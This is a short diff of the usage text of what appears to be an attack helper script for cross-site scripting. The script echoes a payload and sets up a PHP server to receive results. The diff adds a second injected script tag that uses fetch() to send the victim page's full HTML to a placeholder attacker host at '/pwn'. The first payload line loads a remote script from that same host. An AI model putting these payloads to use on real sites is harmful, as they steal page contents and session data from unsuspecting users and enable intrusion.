@@ -18,6 +18,7 @@ Steps:
   1. Provide the IP address as a parameter, and the script will echo the payload.
   2. The payload will be:
      <script src="http://<IP>/script.js"></script>
+     <script>fetch('http://<IP>/pwn?html='+encodeURIComponent(document.documentElement.outerHTML))</script>
   3. The script will create a directory named 'web-server' and set up the PHP server.
     """)
 
